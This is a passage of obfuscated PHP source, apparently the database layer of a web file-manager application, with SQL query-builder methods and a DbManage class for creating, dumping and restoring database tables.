implode($ú³¼…¼´[60], $this->parseValue($Õ‘„¡Êİ[1])); $¬ˆŠ¾øê .= $ ºšØĞë . $ú³¼…¼´[63] . $this->exp[$¹Û÷š²®] . $ú³¼…¼´[1061] . $¶¥¶€ùÃ . $ú³¼…¼´[1063]; } } elseif (preg_match($ú³¼…¼´[1185], $Õ‘„¡Êİ[0])) { $Ó¹Ü©ê¶ = is_string($Õ‘„¡Êİ[1]) ? explode($ú³¼…¼´[60], $Õ‘„¡Êİ[1]) : $Õ‘„¡Êİ[1]; $¬ˆŠ¾øê .= $ú³¼…¼´[1061] . $ ºšØĞë . $ú³¼…¼´[63] . $this->exp[$¹Û÷š²®] . $ú³¼…¼´[63] . $this->parseValue($Ó¹Ü©ê¶[0]) . $ú³¼…¼´[1168] . $this->parseValue($Ó¹Ü©ê¶[1]) . $ú³¼…¼´[365]; } else { think_exception(think_lang($ú³¼…¼´[1171]) . $ú³¼…¼´[4] . $Õ‘„¡Êİ[0]); } } else { $÷’¡£¡¸ = count($Õ‘„¡Êİ); $½ÂÕ—…Ù = $ú³¼…¼´[12]; if (is_string($Õ‘„¡Êİ[$÷’¡£¡¸ - 1])) { $½ÂÕ—…Ù = isset($Õ‘„¡Êİ[$÷’¡£¡¸ - 1]) ? strtoupper($Õ‘„¡Êİ[$÷’¡£¡¸ - 1]) : $ú³¼…¼´[12]; if (in_array($½ÂÕ—…Ù, array($ú³¼…¼´[1165], $ú³¼…¼´[1166], $ú³¼…¼´[1167]))) { $÷’¡£¡¸ = $÷’¡£¡¸ - 1; } } else { $½ÂÕ—…Ù = $ú³¼…¼´[1165]; } for ($ãŒˆÂ» = 0; $ãŒˆÂ» < $÷’¡£¡¸; $ãŒˆÂ»++) { $Ó¹Ü©ê¶ = is_array($Õ‘„¡Êİ[$ãŒˆÂ»]) ? $Õ‘„¡Êİ[$ãŒˆÂ»][1] : $Õ‘„¡Êİ[$ãŒˆÂ»]; if ($ú³¼…¼´[381] == strtolower($Õ‘„¡Êİ[$ãŒˆÂ»][0])) { $¬ˆŠ¾øê .= $ú³¼…¼´[346] . $ ºšØĞë . $ú³¼…¼´[63] . $Ó¹Ü©ê¶ . $ú³¼…¼´[1182] . $½ÂÕ—…Ù . $ú³¼…¼´[63]; } else { $ùç€ä‹ = is_array($Õ‘„¡Êİ[$ãŒˆÂ»]) ? $this->exp[strtolower($Õ‘„¡Êİ[$ãŒˆÂ»][0])] : $ú³¼…¼´[473]; if (!$ùç€ä‹ && is_array($Õ‘„¡Êİ[$ãŒˆÂ»]) && in_array($Õ‘„¡Êİ[$ãŒˆÂ»][0], array($ú³¼…¼´[473], $ú³¼…¼´[1175], $ú³¼…¼´[1176], $ú³¼…¼´[1177], $ú³¼…¼´[1178], $ú³¼…¼´[1179]))) { $ùç€ä‹ = $Õ‘„¡Êİ[$ãŒˆÂ»][0]; } $¬ˆŠ¾øê .= $ú³¼…¼´[346] . $ ºšØĞë . $ú³¼…¼´[63] . $ùç€ä‹ . $ú³¼…¼´[63] . $this->parseValue($Ó¹Ü©ê¶) . $ú³¼…¼´[1182] . $½ÂÕ—…Ù . $ú³¼…¼´[63]; } } $¬ˆŠ¾øê = substr($¬ˆŠ¾øê, 0, -4); } } else { $¬ˆŠ¾øê .= $ ºšØĞë . $ú³¼…¼´[1186] . $this->parseValue($Õ‘„¡Êİ); } return $¬ˆŠ¾øê; } protected function parseThinkWhere($Ç¤¯ãúÖ, $†œù¿Ë™) { $«›™êèÔ =& $_SERVER[øşô´çË]; $—î«½Á = $«›™êèÔ[12]; switch ($Ç¤¯ãúÖ) { case $«›™êèÔ[436]: $—î«½Á = $†œù¿Ë™; break; case $«›™êèÔ[1169]: $—î«½Á = is_string($†œù¿Ë™) ? $†œù¿Ë™ : substr($this->parseWhere($†œù¿Ë™), 6); break; case $«›™êèÔ[1187]: parse_str($†œù¿Ë™, $ÂÃœ¸Ğ¿); if (isset($ÂÃœ¸Ğ¿[$«›™êèÔ[1164]])) { $İ­ÔÉìŒ = $«›™êèÔ[63] . strtoupper($ÂÃœ¸Ğ¿[$«›™êèÔ[1164]]) . $«›™êèÔ[63]; unset($ÂÃœ¸Ğ¿[$«›™êèÔ[1164]]); } else { $İ­ÔÉìŒ = $«›™êèÔ[1168]; } $âã¿½ò = array(); foreach ($ÂÃœ¸Ğ¿ as $ÍÈÒê => $Çßğªö‰) { $âã¿½ò[] = $this->parseKey($ÍÈÒê) . $«›™êèÔ[1186] . $this->parseValue($Çßğªö‰); } $—î«½Á = implode($İ­ÔÉìŒ, $âã¿½ò); break; } return $—î«½Á; } protected function parseLimit($®¨èï¯) { $ı¸¨Àû‹ =& $_SERVER[øşô´çË]; return !empty($®¨èï¯) ? $ı¸¨Àû‹[61] . $®¨èï¯ . $ı¸¨Àû‹[63] : $ı¸¨Àû‹[12]; } protected function parseJoin($ÜŞãä¨È) { $˜€ûçû =& $_SERVER[øşô´çË]; $ñ±›Æ›… = $˜€ûçû[12]; if (!empty($ÜŞãä¨È)) { if (is_array($ÜŞãä¨È)) { foreach ($ÜŞãä¨È as $Ç…–Å£ => $‚æŠ‚ãĞ) { if (!1 !== stripos($‚æŠ‚ãĞ, $˜€ûçû[1188])) { $ñ±›Æ›… .= $˜€ûçû[63] . $‚æŠ‚ãĞ; } else { $ñ±›Æ›… .= $˜€ûçû[1189] . $‚æŠ‚ãĞ; } } } else { $ñ±›Æ›… .= $˜€ûçû[1189] . $ÜŞãä¨È; } } $ñ±›Æ›… = preg_replace($˜€ûçû[1190], think_config($˜€ûçû[1091]) . $˜€ûçû[1191], $ñ±›Æ›…); return $ñ±›Æ›…; } protected function parseOrder($”¯Ï‡·) { $¥» „ÌÆ =& $_SERVER[øşô´çË]; if (is_array($”¯Ï‡·)) { $ÑáşÎ°á = array(); foreach ($”¯Ï‡· as $ïÉ¶Ô•• => $ƒÚ‡š¡‰) { if (is_numeric($ïÉ¶Ô••)) { $ÑáşÎ°á[] = $this->parseKey($ƒÚ‡š¡‰); } else { $ƒÚ‡š¡‰ = in_array(strtoupper(trim($ƒÚ‡š¡‰)), array($¥» „ÌÆ[1192], $¥» „ÌÆ[1193])) ? $¥» „ÌÆ[63] . $ƒÚ‡š¡‰ : $¥» „ÌÆ[12]; if (preg_match($¥» „ÌÆ[1194], $ïÉ¶Ô••)) { $ÑáşÎ°á[] = $this->parseKey($ïÉ¶Ô••) . $ƒÚ‡š¡‰; } else { think_exception($¥» „ÌÆ[1195] . $ïÉ¶Ô••); } } } $”¯Ï‡· = implode($¥» „ÌÆ[60], $ÑáşÎ°á); } return !empty($”¯Ï‡·) ? $¥» „ÌÆ[1196] . $”¯Ï‡· : $¥» „ÌÆ[12]; } protected function parseGroup($¥±‰ºèÕ) { $‰ÜòÄÅê =& $_SERVER[øşô´çË]; return !empty($¥±‰ºèÕ) ? $‰ÜòÄÅê[1197] . $¥±‰ºèÕ : $‰ÜòÄÅê[12]; } protected function parseHaving($âŸÌÚÕâ) { $ÈäïŸ‘¹ =& $_SERVER[øşô´çË]; return !empty($âŸÌÚÕâ) ? $ÈäïŸ‘¹[1198] . $âŸÌÚÕâ : $ÈäïŸ‘¹[12]; } protected function parseComment($ºÚØÆ‚) { $ëşëáİ‡ =& $_SERVER[øşô´çË]; return !empty($ºÚØÆ‚) ? $ëşëáİ‡[1199] . $ºÚØÆ‚ . $ëşëáİ‡[1200] : $ëşëáİ‡[12]; } protected function parseDistinct($¸½«‰ä•) { $ÃîŞËíû =& $_SERVER[øşô´çË]; return !empty($¸½«‰ä•) ? $ÃîŞËíû[1201] : $ÃîŞËíû[12]; } protected function parseUnion($ŞğŸÁ§Û) { $ôïœ¿Ïµ =& $_SERVER[øşô´çË]; if (empty($ŞğŸÁ§Û)) { return $ôïœ¿Ïµ[12]; } if (isset($ŞğŸÁ§Û[$ôïœ¿Ïµ[432]])) { $£»îÊ„Š = $ôïœ¿Ïµ[1202]; unset($ŞğŸÁ§Û[$ôïœ¿Ïµ[432]]); } else { $£»îÊ„Š = $ôïœ¿Ïµ[1203]; } foreach ($ŞğŸÁ§Û as $¼÷ÃßÑ›) { $Öª–òŞÍ[] = $£»îÊ„Š . (is_array($¼÷ÃßÑ›) ? $this->buildSelectSql($¼÷ÃßÑ›) : $¼÷ÃßÑ›); } return implode($ôïœ¿Ïµ[63], $Öª–òŞÍ); } public function insert($¶èûà«ß, $ññ«¿Ø = array(), $û”í‡Ş‡ = false) { $˜÷î²à =& $_SERVER[øşô´çË]; $®ïšÕ¹ = $û±ãş£¹ = array(); $this->model = $ññ«¿Ø[$˜÷î²à[368]]; foreach ($¶èûà«ß as $«Ãã€è‡ => $îŸ“èŠ) { if (is_array($îŸ“èŠ) && $˜÷î²à[381] == $îŸ“èŠ[0]) { $û±ãş£¹[] = $this->parseKey($«Ãã€è‡); $®ïšÕ¹[] = $îŸ“èŠ[1]; } elseif (is_scalar($îŸ“èŠ) || is_null($îŸ“èŠ)) { $û±ãş£¹[] = $this->parseKey($«Ãã€è‡); $®ïšÕ¹[] = $this->parseValue($îŸ“èŠ); } } $ìÁ²›¥ö = ($û”í‡Ş‡ ? $˜÷î²à[1065] : $˜÷î²à[1066]) . $˜÷î²à[1067] . $this->parseTable($ññ«¿Ø[$˜÷î²à[366]]) . $˜÷î²à[1061] . implode($˜÷î²à[60], $û±ãş£¹) . $˜÷î²à[1062] . implode($˜÷î²à[60], $®ïšÕ¹) . $˜÷î²à[1063]; $ìÁ²›¥ö .= $this->parseLock(isset($ññ«¿Ø[$˜÷î²à[1002]]) ? $ññ«¿Ø[$˜÷î²à[1002]] : !1); $ìÁ²›¥ö .= $this->parseComment(!empty($ññ«¿Ø[$˜÷î²à[438]]) ? $ññ«¿Ø[$˜÷î²à[438]] : $˜÷î²à[12]); return $this->execute($ìÁ²›¥ö, $this->parseBind(!empty($ññ«¿Ø[$˜÷î²à[370]]) ? $ññ«¿Ø[$˜÷î²à[370]] : array())); } public function selectInsert($ƒµ¢¶®¢, $·æóÚ¬Ÿ, $ª¿æÚË´ = array()) { $’Ü¨ªÒ =& $_SERVER[øşô´çË]; $this->model = $ª¿æÚË´[$’Ü¨ªÒ[368]]; if (is_string($ƒµ¢¶®¢)) { $ƒµ¢¶®¢ = explode($’Ü¨ªÒ[60], $ƒµ¢¶®¢); } array_walk($ƒµ¢¶®¢, array($this, $’Ü¨ªÒ[1064])); $Ó›«íñ„ = $’Ü¨ªÒ[1204] . $this->parseTable($·æóÚ¬Ÿ) . $’Ü¨ªÒ[1061] . implode($’Ü¨ªÒ[60], $ƒµ¢¶®¢) . $’Ü¨ªÒ[1182]; $Ó›«íñ„ .= $this->buildSelectSql($ª¿æÚË´); return $this->execute($Ó›«íñ„, $this->parseBind(!empty($ª¿æÚË´[$’Ü¨ªÒ[370]]) ? $ª¿æÚË´[$’Ü¨ªÒ[370]] : array())); } public function update($³¡ï‘áô, $ûâ§ÇŸ) { $²³ˆÉâ† =& $_SERVER[øşô´çË]; $this->model = $ûâ§ÇŸ[$²³ˆÉâ†[368]]; $˜ä½’Úã = $²³ˆÉâ†[1205] . $this->parseTable($ûâ§ÇŸ[$²³ˆÉâ†[366]]) . $this->parseSet($³¡ï‘áô) . $this->parseWhere(!empty($ûâ§ÇŸ[$²³ˆÉâ†[362]]) ? $ûâ§ÇŸ[$²³ˆÉâ†[362]] : $²³ˆÉâ†[12]) . $this->parseOrder(!empty($ûâ§ÇŸ[$²³ˆÉâ†[450]]) ? $ûâ§ÇŸ[$²³ˆÉâ†[450]] : $²³ˆÉâ†[12]) . $this->parseLimit(!empty($ûâ§ÇŸ[$²³ˆÉâ†[377]]) ? $ûâ§ÇŸ[$²³ˆÉâ†[377]] : $²³ˆÉâ†[12]) . $this->parseLock(isset($ûâ§ÇŸ[$²³ˆÉâ†[1002]]) ? $ûâ§ÇŸ[$²³ˆÉâ†[1002]] : !1) . $this->parseComment(!empty($ûâ§ÇŸ[$²³ˆÉâ†[438]]) ? $ûâ§ÇŸ[$²³ˆÉâ†[438]] : $²³ˆÉâ†[12]); return $this->execute($˜ä½’Úã, $this->parseBind(!empty($ûâ§ÇŸ[$²³ˆÉâ†[370]]) ? $ûâ§ÇŸ[$²³ˆÉâ†[370]] : array())); } public function delete($ğüŒæäÒ = array()) { $ŞŞ·ûóè =& $_SERVER[øşô´çË]; $this->model = $ğüŒæäÒ[$ŞŞ·ûóè[368]]; $ˆö½ÌØá = $ŞŞ·ûóè[1206] . $this->parseTable($ğüŒæäÒ[$ŞŞ·ûóè[366]]) . $this->parseWhere(!empty($ğüŒæäÒ[$ŞŞ·ûóè[362]]) ? $ğüŒæäÒ[$ŞŞ·ûóè[362]] : $ŞŞ·ûóè[12]) . $this->parseOrder(!empty($ğüŒæäÒ[$ŞŞ·ûóè[450]]) ? $ğüŒæäÒ[$ŞŞ·ûóè[450]] : $ŞŞ·ûóè[12]) . $this->parseLimit(!empty($ğüŒæäÒ[$ŞŞ·ûóè[377]]) ? $ğüŒæäÒ[$ŞŞ·ûóè[377]] : $ŞŞ·ûóè[12]) . $this->parseLock(isset($ğüŒæäÒ[$ŞŞ·ûóè[1002]]) ? $ğüŒæäÒ[$ŞŞ·ûóè[1002]] : !1) . $this->parseComment(!empty($ğüŒæäÒ[$ŞŞ·ûóè[438]]) ? $ğüŒæäÒ[$ŞŞ·ûóè[438]] : $ŞŞ·ûóè[12]); return $this->execute($ˆö½ÌØá, $this->parseBind(!empty($ğüŒæäÒ[$ŞŞ·ûóè[370]]) ? $ğüŒæäÒ[$ŞŞ·ûóè[370]] : array())); } public function select($ ÒªÑ×Ò = array()) { $°‰¤üµ =& $_SERVER[øşô´çË]; $this->model = $ ÒªÑ×Ò[$°‰¤üµ[368]]; $­œåÔğ¨ = $this->buildSelectSql($ ÒªÑ×Ò); $êšâçùè = isset($ ÒªÑ×Ò[$°‰¤üµ[433]]) ? $ ÒªÑ×Ò[$°‰¤üµ[433]] : !1; if ($êšâçùè) { $½‘í®± = is_string($êšâçùè[$°‰¤üµ[105]]) ? $êšâçùè[$°‰¤üµ[105]] : $°‰¤üµ[1207] . md5($­œåÔğ¨); $çùäŠ‹Ä = think_cache($½‘í®±, $°‰¤üµ[12], $êšâçùè); if (!1 !== $çùäŠ‹Ä) { return $çùäŠ‹Ä; } } $ŞĞÖíâ = $this->query($­œåÔğ¨, $this->parseBind(!empty($ ÒªÑ×Ò[$°‰¤üµ[370]]) ? $ ÒªÑ×Ò[$°‰¤üµ[370]] : array())); if ($êšâçùè && !1 !== $ŞĞÖíâ) { think_cache($½‘í®±, $ŞĞÖíâ, $êšâçùè); } return $ŞĞÖíâ; } public function buildSelectSql($ôÚÛø = array()) { $Ü®…²§¿ =& $_SERVER[øşô´çË]; if (isset($ôÚÛø[$Ü®…²§¿[437]])) { if (strpos($ôÚÛø[$Ü®…²§¿[437]], $Ü®…²§¿[60])) { list($àáâË¥«, $®¸â–œ) = explode($Ü®…²§¿[60], $ôÚÛø[$Ü®…²§¿[437]]); } else { $àáâË¥« = $ôÚÛø[$Ü®…²§¿[437]]; } $àáâË¥« = $àáâË¥« ? $àáâË¥« : 1; $®¸â–œ = isset($®¸â–œ) ? $®¸â–œ : (is_numeric($ôÚÛø[$Ü®…²§¿[377]]) ? $ôÚÛø[$Ü®…²§¿[377]] : 20); $ù×´™œŒ = $®¸â–œ * ((int) $àáâË¥« - 1); $ôÚÛø[$Ü®…²§¿[377]] = $ù×´™œŒ . $Ü®…²§¿[60] . $®¸â–œ; } if (think_config($Ü®…²§¿[1208])) { $È‰õåŞ = $Ü®…²§¿[1209] . md5(serialize($ôÚÛø)); $ÙÍğ–×§ = think_cache($È‰õåŞ); if ($ÙÍğ–×§) { return $ÙÍğ–×§; } } $ºæ—êğ = $this->parseSql($this->selectSql, $ôÚÛø); $ºæ—êğ .= $this->parseLock(isset($ôÚÛø[$Ü®…²§¿[1002]]) ? $ôÚÛø[$Ü®…²§¿[1002]] : !1); if (isset($È‰õåŞ)) { think_cache($È‰õåŞ, $ºæ—êğ); } return $ºæ—êğ; } public function parseSql($ğØËÍù», $ŞƒäğÛ = array()) { $¸ûÇ­°Í =& $_SERVER[øşô´çË]; $ğØËÍù» = str_replace(array($¸ûÇ­°Í[1210], $¸ûÇ­°Í[1211], $¸ûÇ­°Í[1212], $¸ûÇ­°Í[1213], $¸ûÇ­°Í[1214], $¸ûÇ­°Í[1215], $¸ûÇ­°Í[1216], $¸ûÇ­°Í[1217], $¸ûÇ­°Í[1218], $¸ûÇ­°Í[1219], $¸ûÇ­°Í[1220]), array($this->parseTable("{$ŞƒäğÛ[$¸ûÇ­°Í[366]]}"), $this->parseDistinct(isset($ŞƒäğÛ[$¸ûÇ­°Í[1221]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[1221]] : !1), $this->parseField(!empty($ŞƒäğÛ[$¸ûÇ­°Í[360]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[360]] : $¸ûÇ­°Í[230]), $this->parseJoin(!empty($ŞƒäğÛ[$¸ûÇ­°Í[369]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[369]] : $¸ûÇ­°Í[12]), $this->parseWhere(!empty($ŞƒäğÛ[$¸ûÇ­°Í[362]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[362]] : $¸ûÇ­°Í[12]), $this->parseGroup(!empty($ŞƒäğÛ[$¸ûÇ­°Í[607]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[607]] : $¸ûÇ­°Í[12]), $this->parseHaving(!empty($ŞƒäğÛ[$¸ûÇ­°Í[1222]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[1222]] : $¸ûÇ­°Í[12]), $this->parseOrder(!empty($ŞƒäğÛ[$¸ûÇ­°Í[450]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[450]] : $¸ûÇ­°Í[12]), $this->parseLimit(!empty($ŞƒäğÛ[$¸ûÇ­°Í[377]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[377]] : $¸ûÇ­°Í[12]), $this->parseUnion(!empty($ŞƒäğÛ[$¸ûÇ­°Í[431]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[431]] : $¸ûÇ­°Í[12]), $this->parseComment(!empty($ŞƒäğÛ[$¸ûÇ­°Í[438]]) ? $ŞƒäğÛ[$¸ûÇ­°Í[438]] : $¸ûÇ­°Í[12])), $ğØËÍù»); return $ğØËÍù»; } public function getLastSql($ä›Î¨ş = '') { return $ä›Î¨ş ? $this->modelSql[$ä›Î¨ş] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($š¦ñ¸) { return addslashes($š¦ñ¸); } public function setModel($¼ŒÇ ­•) { $this->model = $¼ŒÇ ­•; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { public $message = ''; function __construct($’ßåÜì„ = array()) { $¾•…·ÜŒ =& $_SERVER[øşô´çË]; if (empty($’ßåÜì„)) { $’ßåÜì„ = $GLOBALS[$¾•…·ÜŒ[6]][$¾•…·ÜŒ[31]]; } $this->database = $’ßåÜì„; } public function model($¥’ç¸×Ì = '') { return new ModelBase($¥’ç¸×Ì, $_SERVER[øşô´çË][12], $this->database); } public function db($º°¸æ « = false) { $Í‰¹½Íê =& $_SERVER[øşô´çË]; $È­÷ˆúÑ = array_change_key_case($this->database); if ($this->dbType() == $Í‰¹½Íê[23] || !$º°¸æ «) { return $this->model()->db(); } $ÎæÄèà­ = $È­÷ˆúÑ[$Í‰¹½Íê[1136]]; $È­÷ˆúÑ[$Í‰¹½Íê[1136]] = $Í‰¹½Íê[12]; if ($È­÷ˆúÑ[$Í‰¹½Íê[1131]] == $Í‰¹½Íê[1128]) { $¡‡ÉÊÎĞ = $È­÷ˆúÑ[$Í‰¹½Íê[1137]]; $È­÷ˆúÑ[$Í‰¹½Íê[1137]] = substr($¡‡ÉÊÎĞ, 0, strrpos($¡‡ÉÊÎĞ, $Í‰¹½Íê[1223])); } $this->database = $È­÷ˆúÑ; $Ô•ŒêŒ = $this->model()->db(); $à¤Şƒ¡ = $Ô•ŒêŒ->execute("\163\150\157\x77\40\144\x61\x74\141\x62\141\x73\145\x73\x20\154\x69\153\145\40\x27{$ÎæÄèà­}\47"); if (!$à¤Şƒ¡) { try { $Ô•ŒêŒ->execute("\143\162\145\x61\x74\x65\x20\144\x61\x74\141\x62\141\163\145\x20\x60{$ÎæÄèà­}\x60"); } catch (Exception $íäˆŸã) { $this->message = $íäˆŸã->getMessage(); return !1; } } $È­÷ˆúÑ[$Í‰¹½Íê[1136]] = $ÎæÄèà­; if ($È­÷ˆúÑ[$Í‰¹½Íê[1131]] == $Í‰¹½Íê[1128]) { $È­÷ˆúÑ[$Í‰¹½Íê[1137]] .= $Í‰¹½Íê[1223] . $ÎæÄèà­; } $this->database = $È­÷ˆúÑ; try { $Ô•ŒêŒ->execute("\x75\x73\145\40\x60{$ÎæÄèà­}\140"); } catch (Exception $íäˆŸã) { $this->message = $íäˆŸã->getMessage(); return !1; } return $Ô•ŒêŒ; } public function createTable($ÔÌ½¦ëÍ, &$®Ğ‰úÂÀ) { $»å¤‡ôå =& $_SERVER[øşô´çË]; if (!IO::exist($ÔÌ½¦ëÍ)) { show_json(LNG($»å¤‡ôå[1224]), !1); } $¸¾ıĞ×ç = $this->model()->db(); $Œ¼íõìÒ = IO::getContent($ÔÌ½¦ëÍ); $Œ¼íõìÒ = str_ireplace($»å¤‡ôå[1225], $»å¤‡ôå[1226], $Œ¼íõìÒ); $Ìœ½Äµú = sqlSplit($Œ¼íõìÒ); foreach ($Ìœ½Äµú as $«üÓ¯ú­) { $ƒ’å‹ = stripos($«üÓ¯ú­, $»å¤‡ôå[1227]) === 0; if ($ƒ’å‹) { $®Ğ‰úÂÀ->task[$»å¤‡ôå[1228]] += 1; } $¸¾ıĞ×ç->execute($«üÓ¯ú­); if ($ƒ’å‹) { preg_match($»å¤‡ôå[1229], $«üÓ¯ú­, $êœèèİ¡); $®Ğ‰úÂÀ->task[$»å¤‡ôå[1230]] = $êœèèİ¡[1]; $®Ğ‰úÂÀ->update(1); } } } public function insertTable($Êæá›Ûµ, &$¡ŸâĞ) { $‰Îœ’Ë =& $_SERVER[øşô´çË]; $ªª¨íÃ = $this->model()->db(); $á‹—÷ğÖ = $æøé¿Ìû ? array($æøé¿Ìû) : $ªª¨íÃ->getTables(); foreach ($Êæá›Ûµ as $•íÊŠ©) { $æøé¿Ìû = basename($•íÊŠ©, $‰Îœ’Ë[893]); if (!in_array($æøé¿Ìû, $á‹—÷ğÖ)) { continue; } $¡ŸâĞ->task[$‰Îœ’Ë[1230]] = $æøé¿Ìû; if ($æøé¿Ìû == $‰Îœ’Ë[481]) { continue; } if (get_filesize($•íÊŠ©) == 0) { continue; } $ÕºõÎşÀ = $this->sqlToDb($•íÊŠ©, $¡ŸâĞ); if (!$ÕºõÎşÀ) { show_json(LNG($‰Îœ’Ë[1231]) . "\133{$æøé¿Ìû}\135", !1); } } } public function sqlFromDb($íÃæŸ¾, $µ À©¸—, &$²€µ£‘„, $ıì®Ôîæ = '') { $µ’”òË =& $_SERVER[øşô´çË]; if ($²€µ£‘„) { $²€µ£‘„->task[$µ’”òË[1230]] = $íÃæŸ¾; } $«Ûúã©Ø = $this->model($íÃæŸ¾); $ó˜Ğà¦ = 0; $¬”â¶µî = 0; $õÕµÓÛœ = 10000; $Ó§›Â® = fopen($µ À©¸—, $µ’”òË[1232]); $‚íÈ‹°½ = $«Ûúã©Ø->getPk(); $£â“´Æ¿ = $«Ûúã©Ø->getDbFields(); $ÁÙ‚ö = $µ’”òË[12]; if ($GLOBALS[$µ’”òË[892]] && in_array($íÃæŸ¾, array($µ’”òË[1233], $µ’”òË[1234]))) { $ÁÙ‚ö = $íÃæŸ¾; } do { $ÕÒ”Šã = array($‚íÈ‹°½ => array($µ’”òË[1178], $¬”â¶µî)); $­´ÜÔ™± = $«Ûúã©Ø->where($ÕÒ”Šã)->field($£â“´Æ¿)->order($‚íÈ‹°½ . $µ’”òË[1235])->limit($õÕµÓÛœ)->select(); $­´ÜÔ™± = !empty($­´ÜÔ™±) ? $­´ÜÔ™± : array(); if (!($½·³–šç = count($­´ÜÔ™±))) { break; } $ –ÍÅ«Ò = end($­´ÜÔ™±); $¬”â¶µî = $ –ÍÅ«Ò[$‚íÈ‹°½]; $ü¶€ğŸÚ = array(); foreach ($­´ÜÔ™± as $¡›×ãº) { if ($ÁÙ‚ö) { if ($íÃæŸ¾ == $µ’”òË[1233]) { if ($¡›×ãº[$µ’”òË[43]] == $µ’”òË[1236]) { $”ğäı¥ = json_decode($¡›×ãº[$µ’”òË[460]], !0); if ($”ğäı¥[$µ’”òË[42]] == $GLOBALS[$µ’”òË[892]] && $”ğäı¥[$µ’”òË[852]] != 1) { continue; } } } else { if ($¡›×ãº[$µ’”òË[43]] == $µ’”òË[1237] && $¡›×ãº[$µ’”òË[105]] == $µ’”òË[888]) { continue; } } } $ü¶€ğŸÚ[] = $µ’”òË[1238] . $this->sqlEncode($¡›×ãº) . $µ’”òË[1239]; } $üİí°İ‘ = "\111\x4e\123\105\122\124\x20\x49\116\124\x4f\x20\x60{$íÃæŸ¾}\140\x20\50\140" . implode($µ’”òË[1240], $£â“´Æ¿) . $µ’”òË[1241]; fwrite($Ó§›Â®, $üİí°İ‘ . implode($µ’”òË[1242], $ü¶€ğŸÚ) . $µ’”òË[84] . PHP_EOL); $ó˜Ğà¦ += $½·³–šç; if ($²€µ£‘„) { $²€µ£‘„->update($½·³–šç); } } while ($õÕµÓÛœ == $½·³–šç); fclose($Ó§›Â®); return $ó˜Ğà¦; } public function sqlToDb($¾ªÊğİ¡, &$ª¿ÖòËµ) { $ñ×´” =& $_SERVER[øşô´çË]; $†÷åø˜ = $this->model()->db(); $éĞ‹Ÿ“« = @fopen($¾ªÊğİ¡, $ñ×´”[1243]); if (!$éĞ‹Ÿ“«) { return !1; } $òŞ«£’‡ = 0; $Š†„ºÑ  = $ñ×´”[12]; $€âéˆÖ = array(); $ë×Êı‚ä = $this->dbType(); $¸Ø¡µôÓ = $ë×Êı‚ä == $ñ×´”[23] ? 500 : 2000; $¾ò¸ƒÔÉ = basename($¾ªÊğİ¡, $ñ×´”[893]); $‘ŠÓêáÆ = 0; $ÁÌ¸îÖÚ = 4194304; while (!feof($éĞ‹Ÿ“«)) { $àÒê×á = trim(fgets($éĞ‹Ÿ“«)); if (!$àÒê×á) { continue; } $Ú¦£Ì‹ı = $this->sqlDecode($àÒê×á, $ë×Êı‚ä, $¾ò¸ƒÔÉ); if (stripos($Ú¦£Ì‹ı, $ñ×´”[439]) === 0) { if (!$Š†„ºÑ ) { $Š†„ºÑ  = $Ú¦£Ì‹ı . $ñ×´”[63]; } continue; } if ($ª¿ÖòËµ) { $ª¿ÖòËµ->task[$ñ×´”[1228]] += 1; } $òŞ«£’‡++; $€âéˆÖ[] = rtrim(rtrim(trim($Ú¦£Ì‹ı), $ñ×´”[60]), $ñ×´”[84]); $‚Şçöƒ¹ = null; $ÇĞ‡Ê‡‡ = strlen($Ú¦£Ì‹ı); $‘ŠÓêáÆ += $ÇĞ‡Ê‡‡; $É¼¨£¶° = strlen($Š†„ºÑ ) + $‘ŠÓêáÆ + (count($€âéˆÖ) - 1); if ($É¼¨£¶° >= $ÁÌ¸îÖÚ) { $‚Şçöƒ¹ = array_pop($€âéˆÖ); if ($òŞ«£’‡ > 1) { $òŞ«£’‡--; } } if ($òŞ«£’‡ >= $¸Ø¡µôÓ || $‚Şçöƒ¹) { $Ú¦£Ì‹ı = $Š†„ºÑ  . implode($ñ×´”[60], $€âéˆÖ); if (!$†÷åø˜->execute($Ú¦£Ì‹ı)) { return !1; } if ($ª¿ÖòËµ) { $ª¿ÖòËµ->update($òŞ«£’‡); } $€âéˆÖ = array(); $òŞ«£’‡ = 0; $‘ŠÓêáÆ = 0; if ($‚Şçöƒ¹) { $€âéˆÖ = array($‚Şçöƒ¹); $òŞ«£’‡ = 1; $‘ŠÓêáÆ = $ÇĞ‡Ê‡‡; } } } fclose($éĞ‹Ÿ“«); if (!empty($€âéˆÖ)) { $Ú¦£Ì‹ı = $Š†„ºÑ  . implode($ñ×´”[60], $€âéˆÖ); if (!$†÷åø˜->execute($Ú¦£Ì‹ı)) { return !1; } if ($ª¿ÖòËµ) { $ª¿ÖòËµ->update($òŞ«£’‡); } } return !0; } public function dropTable($»Û°àÚ£ = null) { $ó­ÒÔ÷Å =& $_SERVER[øşô´çË]; $ÑÉé«Œ™ = $this->model()->db(); $ÙÈ¦‡ = $»Û°àÚ£ ? array($»Û°àÚ£) : $ÑÉé«Œ™->getTables(); if (!$ÙÈ¦‡) { return; } foreach ($ÙÈ¦‡ as $»Û°àÚ£) { if ($»Û°àÚ£) { $»Û°àÚ£ = strtolower($»Û°àÚ£); } else { continue; } $ÑÉé«Œ™->execute($ó­ÒÔ÷Å[1244] . $this->escapeName($»Û°àÚ£) . $ó­ÒÔ÷Å[1245]); } } private function sqlEncode($Ã‹¥ğ) { $°‰Ÿ¹üº =& $_SERVER[øşô´çË]; $íùò¬±’ = array(); foreach ($Ã‹¥ğ as $ôÈ¯ ‚”) { if (is_array($ôÈ¯ ‚”)) { $ôÈ¯ ‚” = json_encode_force($ôÈ¯ ‚”); } $ôÈ¯ ‚” = addslashes($ôÈ¯ ‚”); $ôÈ¯ ‚” = str_replace(array($°‰Ÿ¹üº[1246], $°‰Ÿ¹üº[19], $°‰Ÿ¹üº[426]), array($°‰Ÿ¹üº[1247], $°‰Ÿ¹üº[1248], $°‰Ÿ¹üº[1249]), $ôÈ¯ ‚”); $íùò¬±’[] = $ôÈ¯ ‚”; } return 